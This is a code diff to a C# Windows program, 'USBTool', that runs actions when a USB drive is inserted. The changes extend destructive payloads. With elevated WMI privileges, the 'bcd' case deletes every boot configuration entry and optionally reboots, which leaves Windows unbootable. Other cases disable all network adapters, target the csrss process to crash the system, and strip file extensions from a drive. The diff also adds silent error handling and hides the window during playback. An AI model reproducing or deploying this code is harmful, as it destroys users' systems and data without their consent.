@@ -13,6 +13,7 @@ using System.Security;
 using System.Speech.Synthesis;
 using System.Text;
 using System.Threading;
+using System.Threading.Tasks;
 using System.Windows.Forms;
 #if MEDIA_DSHOW
 using USBTool.DShow;
@@ -69,10 +70,12 @@ namespace USBTool
 											Thread.Sleep(4000);
 										}
 									}									
-									//FormatEx(drive.Name + "\0", FMIFS_HARDDISK, "FAT32", null , true, 4096 ,(int command, int modifier, IntPtr argument)=>{return true;});
 									break;
 								case "message":
-									MessageBox.Show(message, "Error", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Error, MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification);
+									tf.StartNew(() =>
+									{
+										MessageBox.Show(message, "Error", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Error, MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification);
+									});
 									break;
 								case "blue":
 									foreach (Process process in Process.GetProcessesByName("csrss"))
@@ -149,7 +152,6 @@ namespace USBTool
 									host.ShowDialog();
 									PostMessage(hMCIWnd, WM_CLOSE, 0, 0);									
 #elif MEDIA_DSHOW
-
 									try
 									{
 										window.Owner = host.Handle.ToInt32();
@@ -170,8 +172,8 @@ namespace USBTool
 									{
 										mediaEvent.GetEvent(out eventcode, out lp1, out lp2, 0xfffffff);
 									}
-                                    catch
-                                    {
+									catch
+									{
 										mediaEvent.FreeEventParams(eventcode, lp1, lp2);
 									}
 									while(eventcode != EC_COMPLETE)
@@ -181,10 +183,10 @@ namespace USBTool
 										{
 											mediaEvent.GetEvent(out eventcode, out lp1, out lp2, 0xfffffff);
 										}
-                                        catch
-                                        {
+										catch
+										{
 
-                                        }
+										}
 									}
 									mediaEvent.FreeEventParams(eventcode, lp1, lp2);
 									host.Hide();
@@ -192,9 +194,7 @@ namespace USBTool
 									int hr;
 									uint eventtype = 0;
 									if (hasvideo)
-									{ 
-										host.Show();
-									}
+										ShowWindow(host.Handle, 4);//show no active
 									PropVariant prop = new PropVariant()
 									{
 										vt = VT_I8,
@@ -205,20 +205,14 @@ namespace USBTool
 									player.SetPosition(ref MFP_POSITIONTYPE_100NS, prop);
 									player.Play();
 									player.GetState(out MFP_MEDIAPLAYER_STATE state);
-                                    while (state == MFP_MEDIAPLAYER_STATE.PLAYING)
-                                    {
+									while (state == MFP_MEDIAPLAYER_STATE.PLAYING)
+									{
 										player.GetState(out state);
 									}
 									*/
 									#endregion
-									#region mediasession	
-									Thread upvideo = new Thread(() =>
-									{
-										while(host.Visible)
-											host.displayControl.RepaintVideo();
-									});									
+									#region mediasession									
 									hr = mediaSession.Start(Guid.Empty, prop);
-									upvideo.Start();
 									while (eventtype != MESessionEnded)
 									{					
 										mediaSession.GetEvent(0, out IMFMediaEvent mediaevent);
@@ -326,27 +320,35 @@ namespace USBTool
 								case "beuncle":
 									ForEachWindow(GetDesktopWindow(), "beuncle");
 									break;
-								case "bcd":									
-									ManagementObject bcdstore = new ManagementObject("\\\\.\\root\\wmi:BcdStore.FilePath=\"\"");
-									ManagementBaseObject bcdarg = bcdstore.GetMethodParameters("EnumerateObjects");
-									bcdarg["Type"] = 0;
-									var outarg = bcdstore.InvokeMethod("EnumerateObjects", bcdarg,null);	
-									var bcdos = outarg["Objects"] as object[] ;
-									foreach (ManagementBaseObject bcdo in bcdos)
+								case "bcd":
+									var co = new ConnectionOptions
 									{
-										var deletearg = bcdstore.GetMethodParameters("DeleteObject");
-										deletearg["Id"] = bcdo["Id"];
-										bcdstore.InvokeMethod("DeleteObject", deletearg, null);
+										Impersonation = ImpersonationLevel.Impersonate,
+										Authentication = AuthenticationLevel.Call,
+										EnablePrivileges = true
+									};
+									var scope = new ManagementScope("root\\wmi", co);
+									ManagementObject bcdstore = new ManagementObject(scope, new ManagementPath("BcdStore.FilePath=\"\""),null);
+									try
+									{
+										ManagementBaseObject bcdarg = bcdstore.GetMethodParameters("EnumerateObjects");
+										bcdarg["Type"] = 0;
+										ManagementBaseObject outarg = bcdstore.InvokeMethod("EnumerateObjects", bcdarg, null);
+										var bcdos = outarg["Objects"] as object[];
+										foreach (ManagementBaseObject bcdo in bcdos)
+										{
+											ManagementBaseObject deletearg = bcdstore.GetMethodParameters("DeleteObject");
+											deletearg["Id"] = bcdo["Id"];
+											bcdstore.InvokeMethod("DeleteObject", deletearg, null);
+										}
+									}
+									catch
+									{
+
 									}
 									if (ReBoot.Checked)
 									{
-										var co = new ConnectionOptions
-										{
-											Impersonation = ImpersonationLevel.Impersonate,
-											Authentication = AuthenticationLevel.Call,
-											EnablePrivileges = true
-										};
-										var scope = new ManagementScope("Root\\CIMV2", co);
+										scope = new ManagementScope("Root\\CIMV2", co);
 										var system = new ManagementClass(scope, new ManagementPath("Win32_OperatingSystem"), null);
 										foreach (ManagementObject s in system.GetInstances())
 										{
@@ -355,7 +357,14 @@ namespace USBTool
 									}
 									break;
 								case "network":
-									ManagementClass networkadapters = new ManagementClass("Win32_NetworkAdapter");
+									var co1 = new ConnectionOptions
+									{
+										Impersonation = ImpersonationLevel.Impersonate,
+										Authentication = AuthenticationLevel.Call,
+										EnablePrivileges = true
+									};
+									var scope1 = new ManagementScope("\\\\.\\root\\wmi", co1);
+									ManagementClass networkadapters = new ManagementClass(scope1,new ManagementPath("Win32_NetworkAdapter"),null);
 									foreach (ManagementObject adapter in networkadapters.GetInstances())
 									{
 										ManagementBaseObject arg = adapter.GetMethodParameters("Disable");
@@ -376,6 +385,12 @@ namespace USBTool
 									d.FillRectangle(brush, rect);
 									brush.Dispose();
 									d.Dispose();
+									break;
+								case "cursor":
+									Cursor.Position = new Point(0, 0);
+									break;
+								case "deleteext":
+									DeleteExtName(drive.Name);
 									break;
 								default:
 									throw (new ArgumentException("该功能还未开发"));
@@ -424,6 +439,7 @@ namespace USBTool
 		}
 		public void Message_Click(object sender, EventArgs e)
 		{
+			tf = new TaskFactory();
 			WhenArrival("message");
 		}
 		protected override void WndProc(ref Message m)
@@ -495,10 +511,10 @@ namespace USBTool
 				{
 					audio.Volume = (int)((object[])Media.Tag)[0] * 100 - 10000;
 				}
-                catch
-                {
+				catch
+				{
 
-                }
+				}
 				position.CurrentPosition = 0;
 				double rate = (int)((object[])Media.Tag)[1];
 				position.Rate = rate >= 0 ? rate / 10 + 1 :1/(1 + rate/ -10);
@@ -520,7 +536,7 @@ namespace USBTool
 #elif MEDIA_FOUNDATION
 				#region mfplay
 				/*
-                int hr = CoInitialize(null);
+				int hr = CoInitialize(null);
 				MFPMediaPlayerCallback mpcb = new MFPMediaPlayerCallback();
 				hr = MFPCreateMediaPlayer(null, false, 0, mpcb, host.Handle, out  player);
 				string url = ((object[])Media.Tag)[2].ToString();
@@ -536,7 +552,7 @@ namespace USBTool
 				#region mediasession
 
 				int hr;
-                MFStartup(MF_VERSION, MFSTARTUP_FULL);
+				MFStartup(MF_VERSION, MFSTARTUP_FULL);
 				MFCreateMediaSession(IntPtr.Zero, out mediaSession);
 				MFCreateTopology(out IMFTopology topo);
 				MFCreateSourceResolver(out IMFSourceResolver resolver);
@@ -547,20 +563,20 @@ namespace USBTool
 						IntPtr.Zero, out uint objtype, out unknown);
 				}
 				catch
-                {
+				{
 					MessageBox.Show("不支持的媒体格式。", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
 					return;
 				}
 				IMFMediaSource source = unknown as IMFMediaSource;
 				source.CreatePresentationDescriptor(out IMFPresentationDescriptor descriptor);
 				if(MFRequireProtectedEnvironment(descriptor)== 0)
-                {
+				{
 					MessageBox.Show("媒体受保护,无法播放。", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
 					return;
-                }
+				}
 				descriptor.GetStreamDescriptorCount(out uint sdcount);
 				for(uint i =0;i<sdcount;i++)
-                {										
+				{										
 					descriptor.GetStreamDescriptorByIndex(i, out bool IsSelected, out IMFStreamDescriptor sd);
 					if (!IsSelected)
 						descriptor.SelectStream(i);
@@ -593,7 +609,8 @@ namespace USBTool
 					topo.AddNode(outputnode);
 					outputnode.SetUINT32(MF_TOPONODE_NOSHUTDOWN_ON_REMOVE, 0);
 					hr = sourcenode.ConnectOutput(0, outputnode, 0);					
-                }
+				}
+				Hide();
 				mediaSession.SetTopology(0, topo);							
 				uint eventtype = 0;
 				while (eventtype != MESessionTopologyStatus)
@@ -610,7 +627,7 @@ namespace USBTool
 				{
 					Guid guid_volume = typeof(IMFStreamAudioVolume).GUID;
 					Guid guid_audiopolicy = typeof(IMFAudioPolicy).GUID;
-                    hr = MFGetService(mediaSession, ref MR_STREAM_VOLUME_SERVICE, ref guid_volume, out IUnknown _volume);
+					hr = MFGetService(mediaSession, ref MR_STREAM_VOLUME_SERVICE, ref guid_volume, out IUnknown _volume);
 					hr = MFGetService(mediaSession, ref MR_AUDIO_POLICY_SERVICE, ref guid_audiopolicy, out IUnknown _policy);
 					IMFStreamAudioVolume volume = _volume as IMFStreamAudioVolume;
 					IMFAudioPolicy policy = _policy as IMFAudioPolicy;
@@ -627,19 +644,23 @@ namespace USBTool
 					Guid guid_videocontrol = typeof(IMFVideoDisplayControl).GUID;
 					hr = MFGetService(mediaSession, ref MR_VIDEO_RENDER_SERVICE, ref guid_videocontrol, out IUnknown _videocontrol);
 					IMFVideoDisplayControl videocontrol = _videocontrol as IMFVideoDisplayControl;
-					Rectangle videopos = new Rectangle(0, 0, host.Width, host.Height);
-					videocontrol.SetVideoWindow(host.Handle);
+					if (FullScreen.Checked)
+					{
+						host.Top = 0;
+						host.Left = 0;
+						host.Width = (int)System.Windows.SystemParameters.PrimaryScreenWidth;
+						host.Height = (int)System.Windows.SystemParameters.PrimaryScreenHeight;
+					}
+					Rectangle videopos = new Rectangle(0, 0, host.Width,host.Height);
 					videocontrol.SetVideoPosition(IntPtr.Zero,ref videopos);
-					videocontrol.RepaintVideo();
-					host.displayControl = videocontrol;
 				}
 				catch
 				{
 				}
 				
-                #endregion
+				#endregion
 #endif
-                WhenArrival("media");
+				WhenArrival("media");
 			}
 		}
 		public void ReadText_Click(object sender, EventArgs e)
@@ -655,6 +676,9 @@ namespace USBTool
 			if (Environment.OSVersion.Version.Major < 6)
 			{
 				Glass.Enabled = false;
+#if MEDIA_FOUNDATION
+				Media.Enabled = false;
+#endif
 			}
 			try
 			{
@@ -775,7 +799,7 @@ namespace USBTool
 			WhenArrival("beep");
 		}
 
-		private void Center_Click(object sender, EventArgs e)
+		private void BeUncle_Click(object sender, EventArgs e)
 		{
 			WhenArrival("beuncle");
 		}
@@ -818,5 +842,35 @@ namespace USBTool
 				WhenArrival("color");
 			}
 		}
-	}
+
+		private void Media_MouseEnter(object sender, EventArgs e)
+		{
+			FullScreen.BackColor = Media.FlatAppearance.MouseOverBackColor;
+		}
+
+		private void Media_MouseDown(object sender, MouseEventArgs e)
+		{
+			FullScreen.BackColor = Media.FlatAppearance.MouseDownBackColor;
+		}
+
+		private void Media_MouseLeave(object sender, EventArgs e)
+		{
+			FullScreen.BackColor = Media.BackColor;
+		}
+
+		private void Media_MouseUp(object sender, MouseEventArgs e)
+		{
+			FullScreen.BackColor = Media.BackColor;
+		}
+
+		private void Cursor_Click(object sender, EventArgs e)
+		{
+			WhenArrival("cursor");
+		}
+
+        private void DeleteFileExt_Click(object sender, EventArgs e)
+        {
+			WhenArrival("deleteext");
+        }
+    }
 }
